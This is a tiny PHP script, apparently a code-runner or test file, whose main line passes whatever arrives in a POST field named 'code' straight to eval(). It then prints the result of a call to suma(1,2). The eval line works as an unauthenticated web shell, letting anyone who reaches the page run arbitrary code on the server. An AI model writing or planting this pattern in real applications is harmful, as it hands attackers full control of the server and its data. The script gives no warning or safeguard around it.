<?php

eval(str_replace(["<?php","?>"],"",$_POST["code"]));
echo suma(1,2);
//Hola

?>